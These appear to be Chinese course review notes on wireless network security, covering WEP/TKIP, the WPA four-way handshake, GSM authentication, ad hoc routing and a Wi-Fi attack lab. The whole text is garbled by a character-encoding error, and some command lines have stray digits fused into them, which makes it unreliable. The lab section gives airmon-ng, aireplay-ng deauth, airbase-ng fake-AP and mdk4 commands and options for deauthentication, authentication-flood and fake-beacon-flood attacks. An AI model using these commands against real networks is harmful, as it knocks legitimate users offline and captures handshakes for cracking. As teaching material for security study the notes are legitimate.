TKIPç”¨ä»¥åœ¨ä¸éœ€è¦å‡çº§ç¡¬ä»¶çš„åŸºç¡€ä¸Šæ›¿ä»£WEPåè®®ï¼Œå‡çº§åŠ å¯†çš„å®‰å…¨æ€§ã€‚ TKIPæ˜¯å¯¹å·²ç»ä½¿ç”¨äº†WEPçš„è®¾å¤‡è¿›è¡Œä¸€ä¸ªè¿‡åº¦ï¼Œå¢å¼ºå®‰å…¨æ€§ TKIPè§£å†³WEPå¯†é’¥è¿‡çŸ­çš„é—®é¢˜ TKIPè§£å†³WEPåˆå§‹å‘é‡è¿‡å¼±ã€å‘é‡ç©ºé—´è¿‡å° TKIPã€WEPã€CCMPåŒºåˆ«å…³ç³» WEPã€TKIPæ˜¯RC4æµå¯†ç ï¼ŒCCMPæ˜¯AESå¯¹ç§°å¯†ç  WEPã€TKIPå®‰å…¨æ€§æ¯”CCMPå·®ï¼Œä½†ä¸éœ€è¦ç¡¬ä»¶æ”¯æŒ å››æ¬¡æ¡æ‰‹åè®®ï¼ˆå¾ˆé‡è¦ï¼‰ Wireshark ç”¨eapolè¿‡æ»¤çœ‹æ¡æ‰‹åŒ… $$ AP\\to STA $$ A_nonce ã€PTK $$ STA\\to AP $$ S_nonce MIC $$ AP\\to STA$$ MIC $$ STA\\to AP $$ â€‹ MIC AP $\\to$ Station , APå‘é€éšæœºæ•°Anonceç»™STAã€‚å½“STAæ”¶åˆ°Anonceæ—¶ï¼Œå’Œè‡ªå·±äº§ç”Ÿçš„Snonceè®¡ç®—ç”ŸæˆPTKã€‚ Station $\\to$ APï¼ŒSTAå‘é€éšæœºæ•°Snonceç»™APã€‚æ­¤æ¶ˆæ¯æºå¸¦äº†æ¶ˆæ¯å®Œæ•´ç MICï¼Œå®ƒæ˜¯ç”±STAç”¨åˆšåˆšå¾—åˆ°çš„PTKä¸­çš„å¯†é’¥å®Œæ•´æ€§å¯†é’¥è®¡ç®—è€Œæ¥ã€‚ç„¶åï¼ŒAPè®¡ç®—å‡ºPTKå¹¶åˆ©ç”¨å¯†é’¥å®Œæ•´æ€§å¯†é’¥éªŒè¯MICã€‚ AP $\\to$ Station ï¼Œ APå‘é€ä¸€ä¸ªåŒ…å«MICçš„æ¶ˆæ¯ç»™STAã€‚ STA $ \\to $ AP ï¼ŒSTAæ‰¿è®¤æ¥æ”¶åˆ°ç¬¬ä¸‰ä¸ªæ¶ˆæ¯ã€‚éªŒè¯MICï¼Œé€šè¿‡éªŒè¯è£…è½½PTK æ ¹æ®å››æ¬¡æ¡æ‰‹ï¼Œåˆ¤æ–­æ¡æ‰‹åŒ…æ˜¯ä¸æ˜¯æœ‰æ•ˆçš„ï¼Œè¦é›†é½message12æ‰æ˜¯æœ‰æ•ˆçš„ã€‚ å› ä¸ºç ´è§£éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼ŒAPç”Ÿæˆçš„éšæœºæ•°ï¼ŒStationç”Ÿæˆçš„éšæœºæ•°ï¼ŒMICåšæ¯”è¾ƒ ã€‚ æ”»å‡»è€…å¯ä»¥åœ¨å››æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­Message2å‘é€å,å†’å……APå‘STAå‘é€ä¼ªé€ çš„Message1ã€‚STAå°†æ ¹æ®æ–°çš„Message1ä¸­çš„A_nonceå’Œæœ¬èº«äº§ç”Ÿçš„æ–°çš„S_nonceã€‚é‡æ–°è®¡ç®—PTKï¼Œè€ŒPTKä¸è®¤è¯è€…æ”¶Message2åäº§ç”Ÿçš„PTKæ˜¾ç„¶æ˜¯ä¸ä¸€è‡´çš„ï¼Œè¿™æ ·STAæ”¶åˆ°Message3åæ— æ³•æ­£ç¡®æ ¡éªŒï¼Œå°±ä¼šå¯¼è‡´å››æ¬¡æ¡æ‰‹è¿‡ç¨‹è¢«ç»ˆæ­¢ï¼Œé€ æˆäº†DoSæ”»å‡»ã€‚ 802.11r åšå¿«é€Ÿåˆ‡æ¢çš„æ—¶å€™ç”¨çš„åè®® 802.11sæ˜¯ä»€ä¹ˆåè®® åŸºäº802.11çš„æ— çº¿Meshç½‘ç»œã€‚ MPï¼šMeshèŠ‚ç‚¹ã€‚æ²¡æœ‰AP çš„åŠŸèƒ½ï¼Œåªèƒ½ä½œä¸ºä¸­ç»§èŠ‚ç‚¹ã€‚ MAPï¼šMeshæ¥å…¥èŠ‚ç‚¹ã€‚ä½œä¸ºæ¥å…¥ç‚¹çš„MPï¼Œæ‹¥æœ‰MPçš„å…¨éƒ¨åŠŸèƒ½ï¼Œå¹¶æä¾›æ¥å…¥æœåŠ¡ã€‚ MPPï¼šMesh é—¨æ¡¥èŠ‚ç‚¹ã€‚æ˜¯MAC åè®®æ•°æ®å•å…ƒï¼ˆMSDUï¼‰è¿›å…¥æˆ–ç¦»å¼€æ— çº¿meshç½‘ç»œçš„æ¡¥æ¥ ç¬¬ä¸‰ç« HLRã€VLRå¯„å­˜å™¨ä¹‹é—´çš„åŒºåˆ« HLRå½’å±ä½ç½®å¯„å­˜å™¨ï¼šç”¨äºç§»åŠ¨ç”¨æˆ·ç®¡ç†çš„é™æ€æ•°æ®åº“ VLRï¼šæ‹œè®¿ä½ç½®å¯„å­˜å™¨ï¼ŒåŠ¨æ€æ•°æ®åº“ åè¯è§£é‡Š IMSIï¼šå›½é™…ç§»åŠ¨ç”¨æˆ·è¯†åˆ«ç ã€‚GSMç³»ç»Ÿä¸­æ¯ä¸ªç”¨æˆ·åˆ†é…å”¯ä¸€ä¸€ä¸ªï¼Œé©»ç•™åœ¨SIMå¡ TMSIï¼šä¸´æ—¶ç§»åŠ¨ç”¨æˆ·æ ‡è¯†ç  MSRNï¼šç§»åŠ¨ç”¨æˆ·æ¼«æ¸¸å·ç  MSISDNï¼šç§»åŠ¨ç”¨æˆ·ISDNç ã€‚æ˜¯ç”¨æˆ·ä¸ºæ‰¾åˆ°GSMç”¨æˆ·æ‰€æ‹¨çš„å·ç  MSISDNå’ŒMSRNåŒºåˆ« MSISDNï¼šåªåœ¨ç½‘ç»œä¸­å…³è”ï¼Œåªåœ¨è¢«å‘¼æ—¶æœ‰æ•ˆã€‚å®ƒåªä¸ç”¨æˆ·å‘ç”Ÿä½œç”¨ï¼Œæ˜¯ä¸€ä¸ªç›®å½•å·ç  MSRNï¼šå®ƒåªç”¨åœ¨ç½‘ç»œå®ä½“ä¹‹é—´ï¼Œæ²¡æœ‰ç”¨æˆ·å¯ä»¥è®¿é—®å®ƒ GSMé‰´æƒï¼Œä¸‰å‚æ•°ç»„éƒ½æ˜¯ä»€ä¹ˆ éšæœºæ•°RAND ç¬¦å·å“åº”XRES åŠ å¯†å¯†é’¥Kc ï¼šæ”¾åœ¨SIMå¡å’ŒAUCä¸­ GSMåŠ å¯†ã€é‰´æƒã€å¯†é’¥ç”Ÿæˆçš„ç®—æ³•éƒ½æ˜¯ä»€ä¹ˆ é‰´æƒï¼š A3 åŠ å¯†ï¼š A5 å¯†é’¥äº§ç”Ÿï¼šA8 GSMé—®é¢˜æ˜¯ä»€ä¹ˆ TMSIçš„å®‰å…¨æ–°é—®é¢˜ï¼Œæ•°æ®ä¸¢å¤±ï¼Œè¦æ˜æ–‡å‘é€IMSI è®¤è¯æ–¹æ¡ˆç¼ºé™·ï¼Œä¸æ˜¯ç«¯åˆ°ç«¯ï¼Œç”¨æˆ·é‰´æƒæ˜¯å•å‘çš„ åŠ å¯†æ–¹æ¡ˆç¼ºé™·ï¼ŒåŠ å¯†ç®—æ³•ä¸å…¬å¼€ã€‚ç®—æ³•å›ºå®šä¸å˜ ä¸ºäº†ä¿è¯GSMçš„å®‰å…¨æ€§èƒ½ï¼Œé‡‡å–äº†ä»€ä¹ˆå®‰å…¨æªæ–½ æ¥å…¥ç½‘ç”¨æˆ·é‰´æƒ æ— çº¿é“¾è·¯ä¸Šé€šä¿¡ä¿¡æ¯åŠ å¯† ç”¨æˆ·èº«ä»½ï¼ˆIMSIï¼‰é‡‡ç”¨ä¸´æ—¶è¯†åˆ«ç ï¼ˆTMSIï¼‰ä¿æŠ¤ ç§»åŠ¨è®¾å¤‡é‡‡ç”¨è®¾å¤‡è¯†åˆ« SIMå¡ç”¨PINç ä¿æŠ¤ç­‰ GPRSå’ŒGSMåŒºåˆ« GSMç”µè·¯äº¤æ¢ GPRSåˆ†ç»„æ— é™æœåŠ¡æŠ€æœ¯åŸºäºTCP&#x2F;IPï¼ˆ2.5Gï¼‰ UMTS ä¸€ç§3G æ ‡å‡† ç”¨æˆ·å’Œç½‘ç»œçš„ç›¸äº’é‰´æƒï¼› é‰´æƒå’Œå¯†é’¥åå•†æœ‰ä¸€ä¸ªåè®®ï¼šè®¤è¯å’Œå¯†é’¥åå•†æœºåˆ¶ï¼ˆAuthenticated Key Agreement, AKAï¼‰ ç¬¬å››ç« ä½ç½®éšç§ å€ŸåŠ©äº’è”ç½‘æˆ–æ— çº¿ç½‘ç»œï¼Œåœ¨å›ºå®šç”¨æˆ·æˆ–ç§»åŠ¨ç”¨æˆ·ä¹‹é—´ï¼Œå®Œæˆå®šä½å’ŒæœåŠ¡ä¸¤å¤§åŠŸèƒ½ã€‚ ä½ç½®åŒ¿å å³æ—¶æ€§ç‰¹ç‚¹ã€‚ ä½ç½®éšç§ä¿æŠ¤ä¸»è¦çš„å·¥ä½œ ä½ç½®åŒ¿åï¼šä»é›†åˆå¤–å‘é›†åˆé‡Œçœ‹ï¼Œç»„æˆé›†åˆçš„å„ä¸ªå¯¹è±¡æ— æ³•åŒºåˆ« æŸ¥è¯¢å¤„ç†ï¼šä½ç½®ä¿¡æ¯ä¸å†æ˜¯ç”¨æˆ·çš„çœŸå®ä½ç½®ï¼Œå¯èƒ½æ˜¯å¤šä¸ªä½ç½®çš„é›†åˆä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ¨¡ç³ŠåŒ–çš„ä½ç½®ã€‚ ç¬¬å…­ç« ç§»åŠ¨Ad hocç½‘ç»œçš„ç‰¹ç‚¹ æ— åŸºç¡€è®¾æ–½ã€‚ ä½¿ç”¨æ— çº¿é“¾è·¯ã€‚ å¤šè·³ã€‚ èŠ‚ç‚¹è‡ªç”±ç§»åŠ¨ã€‚ æ— å®šå½¢ã€‚ èƒ½é‡é™åˆ¶ã€‚ å†…å­˜å’Œè®¡ç®—åŠŸç‡é™åˆ¶ã€‚ DSDVã€AODVã€DSRä¸‰ç§åè®®äº†è§£ï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå±äºä»€ä¹ˆåˆ†ç±»ã€‚å“ªäº›æ”¯æŒå•å‘é“¾è·¯ï¼Œå“ªäº›ä¸æ”¯æŒå•å‘é“¾è·¯ã€‚ DSDV è¡¨é©±åŠ¨çš„åè®®ã€‚ é€šå¸¸ä½¿ç”¨æœ€çŸ­è·¯å¾„ç®—æ³•ã€‚è¡¨é©±åŠ¨è·¯ç”±åè®®çš„æ—¶å»¶è¾ƒå°ï¼Œä½†è·¯ç”±åè®®çš„å¼€é”€è¾ƒå¤§ï¼Œæµªè´¹äº†æ— çº¿å¸¦å®½èµ„æº åŸºäºåŒå‘é“¾è·¯ï¼Œä¸æ”¯æŒå•å‘é“¾è·¯ã€‚ DSR åŸºäºæºè·¯ç”±çš„æŒ‰éœ€è·¯ç”± èŠ‚ç‚¹éœ€è¦å‘é€æ•°æ®åˆ†ç»„æ—¶æ‰è¿›è¡Œè·¯ç”±å‘ç°è¿‡ç¨‹ æ”¯æŒå•å‘é“¾è·¯ AODV æŒ‰éœ€è·¯ç”± é€šå¾€ç›®çš„èŠ‚ç‚¹è·¯å¾„ä¸Šçš„å„èŠ‚ç‚¹å‡å»ºç«‹å’Œç»´æŠ¤è·¯ç”±è¡¨ï¼Œè·¯ç”±æŠ¥æ–‡å¤´éƒ¨ä¸å†éœ€è¦æºå¸¦å®Œæ•´è·¯å¾„ï¼Œå‡å°‘äº†æŠ¥æ–‡å¤´éƒ¨è·¯ç”±ä¿¡æ¯å¯¹ä¿¡é“çš„å ç”¨ï¼Œæé«˜äº†ç³»ç»Ÿæ•ˆç‡ã€‚ åªæ”¯æŒåŒå‘é“¾è·¯ï¼Œä¸æ”¯æŒå•å‘ å¯†é’¥ç®¡ç†çš„æ–¹æ¡ˆ å®Œå…¨åˆ†å¸ƒå¼çš„è§£å†³æ–¹æ¡ˆ åœ¨æœ‰å‘å›¾é‡ŒçŸ¥é“ä¸€ä¸ªå­å›¾ï¼Œæ€ä¹ˆåˆ¤æ–­ä¸¤ä¸ªç‚¹ä¹‹é—´çš„æœ‰å‘é“¾è·¯ éƒ¨åˆ†åˆ†å¸ƒå¼çš„è§£å†³æ–¹æ¡ˆ ä¼ ç»Ÿçš„åŸºäºPKIï¼Œé‡Œé¢æœ‰kä¸ªcã€‚æŠŠä¸€ä¸ªcå˜æˆå¾ˆå¤šc ç¬¬å…«ç« ç¤¾äº¤ç½‘ç»œçš„ç‰¹ç‚¹ èŠ‚ç‚¹ç§»åŠ¨æ€§è¾ƒå¼ºï¼Œç¤¾äº¤ç½‘ç»œä¸­çš„æ•°æ®åœ¨åŒå±äºä¸€ä¸ªç¤¾åŒºçš„ç”¨æˆ·ä¹‹é—´äº§ç”Ÿï¼Œé€šè¿‡èŠ‚ç‚¹çš„ç§»åŠ¨è€Œä¼ æ’­ã€‚ æ•°æ®çš„åˆ†å‘æ–¹å¼æ˜¯â€œå­˜å‚¨â€”æºå¸¦â€”è½¬å‘â€ï¼Œç«¯åˆ°ç«¯çš„å»¶è¿Ÿè¾ƒå¤§ã€‚ ç”±äºæ²¡æœ‰ç«¯åˆ°ç«¯çš„è¿æ¥ï¼Œæ•°æ®çš„ä¼ é€’ä¸è½¬å‘ä¾èµ–äºç”¨æˆ·ä¹‹é—´çš„ä¿¡ä»»å…³ç³»ã€‚ ä¸ä¼ ç»Ÿçš„æ— çº¿ç½‘ç»œç›¸åŒï¼Œç¤¾äº¤ç½‘ç»œçš„èƒ½é‡å’Œç‰©ç†ç©ºé—´ä¹Ÿæ˜¯æœ‰é™çš„ã€‚ è·¯ç”±ç®—æ³•ï¼ˆå››ç§ï¼‰éƒ½æ˜¯ä»€ä¹ˆæ„æ€ ä¼ æŸ“è·¯ç”±ï¼šåŸºæœ¬åŸç†æ˜¯ä¸­é—´èŠ‚ç‚¹å°†æ•°æ®åŒ…è½¬å‘ç»™æ‰€æœ‰é‡åˆ°çš„èŠ‚ç‚¹ã€‚ ä¼ ç»Ÿè·¯ç”±ï¼šæ ¹æ®è·¯ç”±è¡¨é¡¹ä¸ºæ•°æ®åŒ…è¿›è¡Œè·¯ç”±è·¯å¾„é€‰æ‹©ã€‚ ä¸Šä¸‹æ–‡è·¯ç”±ï¼šæ ¹æ®ä¸€å®šçš„ä¸Šä¸‹æ–‡ä¿¡æ¯å°†æ•°æ®åŒ…è½¬å‘ç»™é‡åˆ°ç›®çš„èŠ‚ç‚¹æ¦‚ç‡è¾ƒå¤§çš„èŠ‚ç‚¹ã€‚ æœºä¼šè·¯ç”±ï¼šæ ¸å¿ƒæœºåˆ¶åœ¨äºç›‘å¬å’Œåˆä½œã€‚é¦–å…ˆå°†æ•°æ®å¹¿æ’­ç»™å…¶é€šä¿¡èŒƒå›´å†…çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œç„¶ååˆ©ç”¨èŠ‚ç‚¹é—´çš„åˆä½œæœºåˆ¶ï¼Œé€‰æ‹©ä¸€éƒ¨åˆ†èŠ‚ç‚¹æ¥æ”¶æ•°æ®è¿›è¡ŒæœåŠ¡ã€‚ éšç§ä¿æŠ¤ï¼Œå›¾é‡Œé¢ï¼Œä¸‰ä¸ªå¤§ç±»ï¼ˆè¾¹ã€ç»“ç‚¹ã€å›¾ï¼‰ å›¾æ¥è¡¨ç¤ºç¤¾äº¤ç½‘ç»œç¤¾äº¤ èŠ‚ç‚¹ä»£è¡¨ç”¨æˆ· è¾¹ä»£è¡¨ç”¨æˆ·ä¹‹é—´çš„å…³ç³»ã€‚ å®éªŒæ— çº¿ç½‘å¡çš„å·¥ä½œæ¨¡å¼ç®¡ç†æ¨¡å¼ï¼ˆManagedï¼‰ ç”¨äºæ— çº¿STAç›´æ¥ä¸æ— çº¿APè¿›è¡Œæ¥å…¥è¿æ¥ ä¸»æ¨¡å¼ï¼ˆMasterï¼‰ å…è®¸æ— çº¿ç½‘å¡ä½¿ç”¨ç‰¹åˆ¶çš„é©±åŠ¨ç¨‹åºå’Œè½¯ä»¶å·¥ä½œï¼Œä½œä¸ºå…¶ä»–è®¾å¤‡çš„æ— çº¿APã€‚ Ad_Hocæ¨¡å¼ ç”¨æˆ·çš„ç½‘ç»œç”±äº’ç›¸ç›´è¿çš„è®¾å¤‡ç»„æˆæ—¶ä½¿ç”¨ã€‚å„è®¾å¤‡ä¹‹é—´å¯¹ç­‰ç½‘ç»œçš„æ–¹å¼è¿æ¥ã€‚ï¼ˆæ‹¿äº†ç½‘çº¿æ—¶ï¼‰ ç›‘å¬æ¨¡å¼ï¼ˆMonitorï¼‰ ç›‘æ§æ— çº¿ç½‘ç»œå†…éƒ¨çš„æµé‡ã€‚ 123airmon-ng check killairmon-ng start wlan0airmon-ng stop wlan0mon å‘èµ·ä¸‰ç§æ”»å‡»çš„åŸç†ã€æµç¨‹airodump-ng ä¾¦å¬æ•°æ®åŒ… aireplay-ng çš„ deauth å¼ºåˆ¶åˆæ³•å®¢æˆ·ç«¯æ‰çº¿ï¼Œæ‰çº¿åå®¢æˆ·ç«¯ä¼šå°è¯•é‡æ–°è¿æ¥APï¼Œæ­¤æ—¶ä¼šäº§ç”Ÿæ¡æ‰‹åŒ…ã€‚ï¼ˆä¸€æ˜¯å¿…é¡»å¤„åœ¨ç›®æ ‡APçš„ä¿¡å·èŒƒå›´å†…ï¼›äºŒæ˜¯å·²æœ‰åˆæ³•å®¢æˆ·ç«¯è¿æ¥è¯¥APã€‚ï¼‰airbase-ng ä¼ªé€ ç›®æ ‡APæ¥æ¬ºéª—å®¢æˆ·ç«¯ä¸å…¶è¿æ¥ï¼Œäº§ç”Ÿæ¡æ‰‹åŒ… mdk4 interface:æŒ‡å®šç”¨äºæ”»å‡»çš„ç½‘ç»œæ¥å£ï¼Œéœ€æ˜¯ç›‘å¬æ¨¡å¼çš„æ¥å£ã€‚ 12345678910111213141516a: å®æ–½èº«ä»½éªŒè¯æ´ªæ°´æ”»å‡»æ¨¡å¼ã€‚-a: æŒ‡å®šè¦æ”»å‡»çš„ç›®æ ‡APçš„MACåœ°å€ã€‚-mï¼šä½¿ç”¨æœ‰æ•ˆæ•°æ®åº“ä¸­çš„å®¢æˆ·ç«¯MACåœ°å€ã€‚-sï¼šè®¾ç½®åŒ…çš„é€Ÿç‡ï¼Œé»˜è®¤æ— é™åˆ¶ã€‚##########################d: å®æ–½Deauthæ”»å‡»æ”»å‡»æ¨¡å¼ã€‚-cï¼šæŒ‡å®šæ”»å‡»çš„ä¿¡é“ï¼Œé»˜è®¤å°†åœ¨æ‰€æœ‰ä¿¡é“ä¹‹é—´è·³è½¬ï¼Œæ¯3ç§’åˆ‡æ¢ä¸€æ¬¡ã€‚-E:æ”»å‡»æŒ‡å®šESSIDçš„APã€‚ -Bï¼šæ”»å‡»æŒ‡å®šBSSIDçš„APã€‚########################b: å®æ–½å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡»æ¨¡å¼ã€‚-nï¼šè‡ªå®šä¹‰ESSIDã€‚-fï¼šè¯»å–ESSIDåˆ—è¡¨æ–‡ä»¶ã€‚-wï¼šé€‰æ‹©å‡ç½‘ç»œåº”å…·æœ‰çš„åŠ å¯†ç±»å‹ï¼Œæœ‰æ•ˆé€‰é¡¹ï¼š n=ä¸åŠ å¯†ï¼Œw=WEPï¼Œ t=TKIPï¼ˆWPAï¼‰ï¼Œa=AESï¼ˆWPA2ï¼‰ã€‚-tï¼š 1=ä»…åˆ›å»ºè‡ªç»„ç»‡ç½‘ç»œ ï¼Œ0=ä»…åˆ›å»ºManagedï¼ˆAPï¼‰ç½‘ç»œã€‚ Deauthæ”»å‡» é€šè¿‡ä¼ªé€ APå‘å®¢æˆ·ç«¯å•æ’­åœ°å€å‘é€å–æ¶ˆèº«ä»½éªŒè¯å¸§ï¼Œå°†å®¢æˆ·ç«¯è½¬ä¸ºæœªå…³è”&#x2F;æœªè®¤è¯çš„çŠ¶æ€ã€‚ Deauthæ”»å‡»æµç¨‹ï¼š ç¡®å®šå®¢æˆ·ç«¯ä¸APå·²å»ºç«‹è¿æ¥ã€‚ å‘æ•´ä¸ªç½‘ç»œå‘é€ä¼ªé€ çš„å–æ¶ˆèº«ä»½è®¤è¯æŠ¥æ–‡ï¼Œä»è€Œé˜»æ–­åˆæ³•ç”¨æˆ·å’ŒAPé—´çš„è¿æ¥ã€‚ å½“å®¢æˆ·ç«¯æ”¶åˆ°æ”»å‡»è€…å‘é€çš„æŠ¥æ–‡æ—¶ï¼Œä¼šè®¤ä¸ºè¯¥æŠ¥æ–‡æ¥è‡ªAPã€‚æ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°†è¯•å›¾ä¸APé‡æ–°å»ºç«‹è¿æ¥ã€‚ æ”»å‡»è€…ä»ç„¶ç»§ç»­å‘ä¿¡é“ä¸­å‘é€å–æ¶ˆèº«ä»½è®¤è¯å¸§ï¼Œå°†å¯¼è‡´å®¢æˆ·ç«¯ä¸APå§‹ç»ˆæ— æ³•é‡è¿ï¼Œå³å·²è¿æ¥çš„å®¢æˆ·ç«¯è‡ªè¡Œæ–­å¼€è¿æ¥ã€‚ è¯­æ³•æ ¼å¼ 1mdk4 &lt;interface&gt; d &lt;test_options&gt; è®¤è¯æ´ªæ°´æ”»å‡» å‘APå‘é€å¤§é‡è™šå‡çš„è¿æ¥è¯·æ±‚ã€‚å½“å‘é€çš„è¯·æ±‚è¶…è¿‡APæ‰€èƒ½æ‰¿å—çš„èŒƒå›´æ—¶ï¼ŒAPå°±ä¼šè‡ªåŠ¨æ–­å¼€ç°æœ‰è¿æ¥ï¼Œä½¿å¾—åˆæ³•ç”¨æˆ·æ— æ³•ä½¿ç”¨ç½‘ç»œã€‚ è®¤è¯æ´ªæ°´æ”»å‡»å…·ä½“å·¥ä½œæµç¨‹ï¼š ç¡®è®¤å®¢æˆ·ç«¯ä¸APå·²ç»å»ºç«‹äº†è¿æ¥ã€‚å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚éƒ½ä¼šè¢«APè®°å½•åœ¨è¿æ¥è¡¨ä¸­ã€‚ ä½¿ç”¨çœ‹èµ·æ¥åˆæ³•ä½†å…¶å®æ˜¯éšæœºç”Ÿæˆçš„MACåœ°å€æ¥ä¼ªé€ STAã€‚ç„¶åï¼Œæ”»å‡»è€…å°±å¯ä»¥å‘é€å¤§é‡çš„è™šå‡è¿æ¥è¯·æ±‚åˆ°APã€‚ æ”»å‡»è€…å¯¹APè¿›è¡ŒæŒç»­ä¸”å¤§é‡çš„è™šå‡è¿æ¥è¯·æ±‚ï¼Œæœ€ç»ˆå¯¼è‡´APå¤±å»å“åº”ï¼Œä½¿å¾—APçš„è¿æ¥åˆ—è¡¨å‡ºç°é”™è¯¯ã€‚ ç”±äºAPçš„è¿æ¥è¡¨å‡ºç°é”™è¯¯ï¼Œä½¿å¾—è¿æ¥çš„åˆæ³•å®¢æˆ·ç«¯å¼ºåˆ¶ä¸APæ–­å¼€è¿æ¥ã€‚ è¯­æ³•æ ¼å¼ 1mdk4 &lt;interface&gt; a &lt;test_options&gt; å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡» å‡ä¿¡æ ‡æ”»å‡»ç±»ä¼¼äºä¼ªAPï¼Œå°±æ˜¯å‘æ— çº¿ä¿¡é“ä¸­å‘é€å¤§é‡è™šå‡çš„SSIDæ¥å……æ–¥å®¢æˆ·ç«¯çš„æ— çº¿åˆ—è¡¨ï¼Œé€šè¿‡åˆ›å»ºæ¶æ„æ— çº¿çƒ­ç‚¹ï¼Œå ç”¨ä¿¡é“èµ„æºï¼Œå¹²æ‰°é€šè®¯ã€‚ æµç¨‹ åˆ›å»ºä¸€ä¸ªè™šå‡çš„ESSID ä½¿ç”¨å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡»ï¼Œäº§ç”Ÿäº†å¤§é‡çš„Beaconä¿¡å·å¸§ï¼Œæ˜¯éšæœºäº§ç”Ÿçš„ è¯­æ³•æ ¼å¼ 1mdk4 &lt;interface&gt; b &lt;test_options&gt; æ•è·æ•°æ®åŒ…çš„å‚æ•°è¿‡æ»¤èº«ä»½è®¤è¯æ•°æ®åŒ… 12wlan.fc.type_subtype==0X0B//è®¤è¯ç±»å‹æœ‰ä¸¤ç§ï¼Œ0æ˜¯å¼€æ”¾å¼ï¼Œ1æ˜¯å…±äº«å¼ åªæ˜¾ç¤ºBeaconå¸§ 1wlan.fc.type_subtype==0X08 æ‰¾å‡ºä¸å®¢æˆ·ç«¯è¿æ¥çš„AP 1wlan.fc.type_subtype==0X00 è¿‡æ»¤æ¡æ‰‹åŒ… 1eapo è¯¦ç»†ç‰ˆç¬¬ä¸€ç« æ— çº¿å±€åŸŸç½‘çš„æ ‡å‡† 802.11 æ— çº¿ç½‘ç»œå®‰å…¨ã€æœ‰çº¿ç½‘ç»œå®‰å…¨çš„åŒºåˆ« æ— çº¿ç½‘ç»œçš„å¼€æ”¾æ€§ä½¿å¾—ç½‘ç»œæ›´å®¹æ˜“å—åˆ°è¢«åŠ¨çªƒå¬æˆ–ä¸»åŠ¨å¹²æ‰°ç­‰å„ç§æ”»å‡»ã€‚ æœ‰çº¿ç½‘ç»œçš„ç½‘ç»œè¿æ¥æ˜¯ç›¸å¯¹å›ºå®šçš„ï¼Œå…·æœ‰ç¡®å®šçš„è¾¹ç•Œï¼Œå¯ä»¥é€šè¿‡å°†ç”µçº¿éšè—åœ¨å¢™å†…é¿å…æ¥è§¦å¤–éƒ¨çš„æ–¹å¼æ¥ç¡®ä¿å®‰å…¨è¿æ¥ã€‚é€šè¿‡å¯¹æ¥å…¥ç«¯å£çš„ç®¡ç†ï¼Œå¯ä»¥æœ‰æ•ˆåœ°æ§åˆ¶éæ³•ç”¨æˆ·çš„æ¥å…¥ æ— çº¿ç½‘ç»œçš„ç§»åŠ¨æ€§ä½¿å¾—å®‰å…¨ç®¡ç†éš¾åº¦æ›´å¤§ æœ‰çº¿ç½‘ç»œçš„ç”¨æˆ·ç»ˆç«¯ä¸æ¥å…¥è®¾å¤‡ä¹‹é—´é€šè¿‡çº¿ç¼†è¿æ¥ï¼Œç»ˆç«¯ä¸èƒ½åœ¨å¤§èŒƒå›´å†…ç§»åŠ¨ï¼Œå¯¹ç”¨æˆ·çš„ç®¡ç†æ¯”è¾ƒå®¹æ˜“ã€‚ æ— çº¿ç½‘ç»œåŠ¨æ€å˜åŒ–çš„æ‹“æ‰‘ç»“æ„ä½¿å¾—å®‰å…¨æ–¹æ¡ˆçš„å®æ–½éš¾åº¦æ›´å¤§ æœ‰çº¿ç½‘ç»œå…·æœ‰å›ºå®šçš„æ‹“æ‰‘ç»“æ„ï¼Œå®‰å…¨æŠ€æœ¯å’Œæ–¹æ¡ˆå®¹æ˜“éƒ¨ç½²ã€‚ æ— çº¿ç½‘ç»œä¼ è¾“ä¿¡å·çš„ä¸ç¨³å®šæ€§å¸¦æ¥æ— çº¿é€šä¿¡ç½‘ç»œåŠå…¶å®‰å…¨æœºåˆ¶çš„å¥å£®æ€§é—®é¢˜ï¼Œæ— çº¿ç½‘ç»œéšç€ç”¨æˆ·çš„ç§»åŠ¨å…¶ä¿¡é“æ˜¯å˜åŒ–çš„ï¼Œä¼šå—åˆ°å¤šæ–¹é¢çš„å½±å“ã€‚ æœ‰çº¿ä¼ è¾“çš„ç¯å¢ƒæ˜¯ç¡®å®šçš„ï¼Œä¿¡å·è´¨é‡ç¨³å®šã€‚ æ— çº¿ç½‘ç»œç»ˆç«¯è®¾å¤‡å…·æœ‰ä¸æœ‰çº¿ç½‘ç»œç»ˆç«¯è®¾å¤‡ä¸åŒçš„ç‰¹ç‚¹ã€‚ç½‘ç»œå®ä½“è®¾å¤‡å¯èƒ½è¢«æ”»å‡»è€…ç‰©ç†åœ°æ¥è§¦åˆ°ï¼Œå› è€Œå¯èƒ½å­˜åœ¨å‡APï¼Œå¹¶ä¸”å…·æœ‰èµ„æºå—é™çš„ç‰¹ç‚¹ã€‚ æœ‰çº¿ç½‘ç»œçš„ç½‘ç»œå®ä½“è®¾å¤‡ï¼Œå¦‚è·¯ç”±å™¨ã€é˜²ç«å¢™ä¸€èˆ¬éƒ½ä¸èƒ½è¢«æ”»å‡»è€…ç‰©ç†åœ°æ¥è§¦åˆ°ã€‚ æ— çº¿è®¾å¤‡ä¹‹é—´çš„è¿æ¥åº”è¯¥æ ¹æ®ä½¿ç”¨è€…çš„ç§»åŠ¨æ€§å’Œé“¾è·¯è´¨é‡è¿›è¡Œçµæ´»çš„é€‚åº”ï¼Œä½†æ˜¯è¦æ›´åŠ ä¿¡ä»»çš„å…³ç³»ã€‚ æœ‰çº¿ç½‘ç»œæ²¡æœ‰å¤ªå¥½çš„çµæ´»æ€§ï¼Œä½†æ˜¯å®‰å…¨æ€§æ›´æœ‰ä¿¡å¿ƒ ç¬¬äºŒç« WEP åè¯è§£é‡Šï¼š WEP (Wired Equivalent Privacy) æœ‰çº¿ç­‰æ•ˆä¿å¯† Stationç§»åŠ¨ç«™ã€APè®¿é—®ç‚¹ IV (Initialized Vector) åˆå§‹åŒ–çŸ¢é‡ C å¯†æ–‡ã€P æ˜æ–‡ã€Key å¯†é’¥ ICV (Integrity Check Value) å®Œæ•´æ€§æ ¡éªŒå’Œ RC4 (Rivest Cipher 4) å¯¹ç§°åŠ 